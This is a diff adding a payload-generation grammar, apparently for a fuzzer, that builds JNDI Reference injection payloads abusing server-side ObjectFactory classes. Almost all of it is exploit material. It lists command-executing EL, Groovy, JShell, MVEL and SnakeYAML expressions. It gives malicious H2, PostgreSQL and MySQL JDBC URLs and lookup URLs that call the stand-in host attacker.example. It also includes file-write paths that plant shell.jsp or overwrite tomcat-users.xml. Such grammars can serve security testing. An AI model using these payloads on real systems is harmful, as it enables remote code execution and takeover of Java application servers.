@@ -1,0 +1,214 @@
+# =============================================================================
+# JNDI ObjectFactory Abuse Grammar — IR (Intermediate Representation)
+# Generates JSON IR for JNDI Reference payloads targeting ObjectFactory abuse.
+#
+# Post-JDK 8u191 vectors: remote codebase loading blocked, exploitation now
+# relies on ObjectFactory implementations already on the classpath.
+#
+# Taxonomy axes:
+#   J1  Factory class selection     → BeanFactory, DataSource, JDBC, custom
+#   J2  Property/attribute mutation  → forceString, bean properties, JDBC URLs
+#   J3  Sink expression mutation     → EL, JShell, Groovy, SnakeYAML, MVEL
+#   J4  Protocol variation           → LDAP, RMI, DNS, IIOP, LDAPS
+#   J5  JDBC driver exploitation     → H2, HSQLDB, PostgreSQL, MySQL, Databricks
+# =============================================================================
+
+!root <ir>
+!max_depth 4
+
+# Full IR object
+<ir> = {"attack_type":"jndi_factory","factory_class":<factory_class>,"reference_class":<reference_class>,"factory_attrs":<factory_attrs>,"sink_type":<sink_type>,"protocol":<protocol>,"lookup_url":<lookup_url>}
+
+# ── Reference class (what the JNDI Reference points to) ──────
+<reference_class> = "javax.el.ELProcessor"
+<reference_class> = "jakarta.el.ELProcessor"
+<reference_class> = "jdk.jshell.JShell"
+<reference_class> = "groovy.lang.GroovyShell"
+<reference_class> = "org.yaml.snakeyaml.Yaml"
+<reference_class> = "org.mvel2.sh.ShellSession"
+<reference_class> = "bsh.Interpreter"
+<reference_class> = "com.thoughtworks.xstream.XStream"
+<reference_class> = "javax.sql.DataSource"
+<reference_class> = "org.apache.catalina.UserDatabase"
+<reference_class> = "org.h2.jdbcx.JdbcDataSource"
+<reference_class> = "org.hsqldb.jdbc.JDBCDataSource"
+<reference_class> = "javax.naming.Context"
+<reference_class> = "java.lang.Object"
+<reference_class> = "javax.management.loading.MLet"
+<reference_class> = "com.sun.glass.utils.NativeLibLoader"
+<reference_class> = "java.lang.ProcessBuilder"
+
+# ── ObjectFactory classes (on classpath) ──────────────────────
+# Tomcat BeanFactory (the most universal vector)
+<factory_class> = "org.apache.naming.factory.BeanFactory"
+# Tomcat DataSource factories
+<factory_class> = "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory"
+<factory_class> = "org.apache.tomcat.jdbc.pool.DataSourceFactory"
+# Third-party DataSource factories
+<factory_class> = "com.alibaba.druid.pool.DruidDataSourceFactory"
+<factory_class> = "com.zaxxer.hikari.HikariJNDIFactory"
+<factory_class> = "org.apache.commons.dbcp2.BasicDataSourceFactory"
+# Tomcat MemoryUserDatabase (file write primitive)
+<factory_class> = "org.apache.catalina.users.MemoryUserDatabaseFactory"
+# WebLogic legacy alias
+<factory_class> = "weblogic.jndi.WLInitialContextFactory"
+# BEA Spring JNDI re-lookup
+<factory_class> = "com.bea.core.repackaged.springframework.jndi.JndiObjectFactoryBean"
+# WebSphere
+<factory_class> = "com.ibm.ws.client.applicationclient.ClientJ2CCFFactory"
+# Spring
+<factory_class> = "org.springframework.beans.factory.config.MethodInvokingFactoryBean"
+# Jetty
+<factory_class> = "org.eclipse.jetty.plus.jndi.Resource"
+# WildFly/JBoss
+<factory_class> = "org.jboss.as.naming.ManagedReferenceObjectFactory"
+# Generic
+<factory_class> = "javax.naming.spi.NamingManager"
+
+# ── Factory attributes (per-factory configuration) ────────────
+# BeanFactory + EL
+<factory_attrs> = {"forceString":"x=eval","x":<el_expression>}
+# BeanFactory + JShell (Java 15+)
+<factory_attrs> = {"forceString":"x=eval","x":<jshell_expression>}
+# BeanFactory + Groovy
+<factory_attrs> = {"forceString":"x=evaluate","x":<groovy_expression>}
+# BeanFactory + SnakeYAML
+<factory_attrs> = {"forceString":"x=load","x":<yaml_payload>}
+# BeanFactory + MVEL
+<factory_attrs> = {"forceString":"x=exec","x":<mvel_expression>}
+# BeanFactory + BeanShell
+<factory_attrs> = {"forceString":"x=eval","x":<bsh_expression>}
+# BeanFactory + XStream
+<factory_attrs> = {"forceString":"x=fromXML","x":<xstream_payload>}
+# MemoryUserDatabaseFactory (file write)
+<factory_attrs> = {"pathname":<file_write_path>,"readonly":"false"}
+# DataSource factory (JDBC exploitation)
+<factory_attrs> = {"url":<jdbc_url>,"driverClassName":<jdbc_driver>}
+# DataSource with initSQL
+<factory_attrs> = {"url":<jdbc_url>,"driverClassName":<jdbc_driver>,"initSQL":<sql_payload>}
+# HikariCP
+<factory_attrs> = {"jdbcUrl":<jdbc_url>,"dataSourceClassName":<jdbc_driver>,"connectionInitSql":<sql_payload>}
+# Druid
+<factory_attrs> = {"url":<jdbc_url>,"driverClassName":<jdbc_driver>,"init":"true","connectionInitSqls":<sql_payload>}
+# Generic bean with arbitrary property
+<factory_attrs> = {"forceString":"x=<setter_method>","x":<generic_payload>}
+
+# ── Sink types ────────────────────────────────────────────────
+<sink_type> = "el_eval"
+<sink_type> = "jshell_eval"
+<sink_type> = "groovy_eval"
+<sink_type> = "yaml_load"
+<sink_type> = "mvel_exec"
+<sink_type> = "bsh_eval"
+<sink_type> = "xstream_deser"
+<sink_type> = "jdbc_init"
+<sink_type> = "jdbc_h2_runscript"
+<sink_type> = "jdbc_hsqldb_call"
+<sink_type> = "jdbc_pgsql_socketfactory"
+<sink_type> = "jdbc_mysql_deser"
+<sink_type> = "jdbc_databricks_jaas"
+<sink_type> = "file_write"
+<sink_type> = "class_load"
+<sink_type> = "cmd_exec"
+
+# ── Protocol schemes ─────────────────────────────────────────
+<protocol> = "ldap"
+<protocol> = "ldaps"
+<protocol> = "rmi"
+<protocol> = "dns"
+<protocol> = "iiop"
+
+# ── Lookup URLs ──────────────────────────────────────────────
+<lookup_url> = "ldap://attacker.example:1389/exploit"
+<lookup_url> = "rmi://attacker.example:1099/exploit"
+<lookup_url> = "ldaps://attacker.example:636/exploit"
+<lookup_url> = "dns://attacker.example"
+<lookup_url> = "iiop://attacker.example:7001/exploit"
+
+# ── Expression Language payloads ─────────────────────────────
+<el_expression> = "Runtime.getRuntime().exec('id')"
+<el_expression> = "''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')"
+<el_expression> = "T(java.lang.Runtime).getRuntime().exec('id')"
+<el_expression> = "new java.lang.ProcessBuilder(new String[]{'id'}).start()"
+
+# ── JShell payloads (Java 15+) ───────────────────────────────
+<jshell_expression> = "Runtime.getRuntime().exec(\"id\")"
+<jshell_expression> = "new ProcessBuilder(\"id\").start()"
+<jshell_expression> = "var r=Runtime.getRuntime();r.exec(\"id\")"
+
+# ── Groovy payloads ──────────────────────────────────────────
+<groovy_expression> = "'id'.execute()"
+<groovy_expression> = "new ProcessBuilder(['id']).start()"
+<groovy_expression> = "['id'].execute()"
+<groovy_expression> = "Runtime.getRuntime().exec('id')"
+
+# ── SnakeYAML payloads ───────────────────────────────────────
+<yaml_payload> = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://attacker.example/exploit']]]]"
+<yaml_payload> = "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'ldap://attacker.example/exploit', autoCommit: true}"
+
+# ── MVEL payloads ────────────────────────────────────────────
+<mvel_expression> = "Runtime.getRuntime().exec('id')"
+<mvel_expression> = "new java.lang.ProcessBuilder(new String[]{'id'}).start()"
+
+# ── BeanShell payloads ───────────────────────────────────────
+<bsh_expression> = "exec(\"id\")"
+<bsh_expression> = "Runtime.getRuntime().exec(\"id\")"
+<bsh_expression> = "new ProcessBuilder(\"id\").start()"
+
+# ── XStream payloads ────────────────────────────────────────
+<xstream_payload> = "\x3cjava.util.PriorityQueue\x3e\x3ccomparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'\x3e\x3c/comparator\x3e\x3c/java.util.PriorityQueue\x3e"
+
+# ── JDBC URLs ────────────────────────────────────────────────
+# H2 Database (RUNSCRIPT → RCE)
+<jdbc_url> = "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://attacker.example/evil.sql'"
+<jdbc_url> = "jdbc:h2:mem:test;INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws Exception { Runtime.getRuntime().exec(cmd)%3B return null%3B }'%3BCALL EXEC('id')"
+# HSQLDB (CALL → arbitrary static method)
+<jdbc_url> = "jdbc:hsqldb:mem:test"
+<jdbc_url> = "jdbc:hsqldb:http://attacker.example/db"
+# PostgreSQL (socketFactory → arbitrary class instantiation)
+<jdbc_url> = "jdbc:postgresql://attacker.example/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://attacker.example/bean.xml"
+<jdbc_url> = "jdbc:postgresql://attacker.example/test?socketFactory=com.sun.rowset.JdbcRowSetImpl&socketFactoryArg=ldap://attacker.example/exploit"
+# MySQL (autoDeserialize → deserialization)
+<jdbc_url> = "jdbc:mysql://attacker.example/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"
+<jdbc_url> = "jdbc:mysql://attacker.example/test?autoDeserialize=true&allowLoadLocalInfile=true"
+# Databricks (krbJAASFile → command injection)
+<jdbc_url> = "jdbc:databricks://host;krbJAASFile=/dev/stdin"
+
+# ── JDBC Drivers ─────────────────────────────────────────────
+<jdbc_driver> = "org.h2.Driver"
+<jdbc_driver> = "org.hsqldb.jdbc.JDBCDriver"
+<jdbc_driver> = "org.postgresql.Driver"
+<jdbc_driver> = "com.mysql.cj.jdbc.Driver"
+<jdbc_driver> = "com.mysql.jdbc.Driver"
+<jdbc_driver> = "com.databricks.client.jdbc.Driver"
+<jdbc_driver> = "org.apache.derby.jdbc.EmbeddedDriver"
+<jdbc_driver> = "org.sqlite.JDBC"
+
+# ── SQL payloads ─────────────────────────────────────────────
+<sql_payload> = "CALL SYSTEM_RANGE(1,1)"
+<sql_payload> = "CALL \"java.lang.Runtime\".exec('id')"
+<sql_payload> = "CREATE ALIAS EXEC AS 'String e(String c) throws Exception { Runtime.getRuntime().exec(c); return null; }'; CALL EXEC('id')"
+<sql_payload> = "SELECT SYSTEM_USER"
+
+# ── File write paths (MemoryUserDatabaseFactory) ─────────────
+<file_write_path> = "../../webapps/ROOT/shell.jsp"
+<file_write_path> = "/tmp/pwned"
+<file_write_path> = "conf/tomcat-users.xml"
+
+# ── Setter methods for generic BeanFactory abuse ─────────────
+<setter_method> = "eval"
+<setter_method> = "exec"
+<setter_method> = "execute"
+<setter_method> = "evaluate"
+<setter_method> = "load"
+<setter_method> = "fromXML"
+<setter_method> = "parse"
+<setter_method> = "compile"
+<setter_method> = "run"
+<setter_method> = "start"
+<setter_method> = "connect"
+
+# ── Generic payloads ─────────────────────────────────────────
+<generic_payload> = "Runtime.getRuntime().exec('id')"
+<generic_payload> = "http://attacker.example/exploit"
+<generic_payload> = "ldap://attacker.example/exploit"
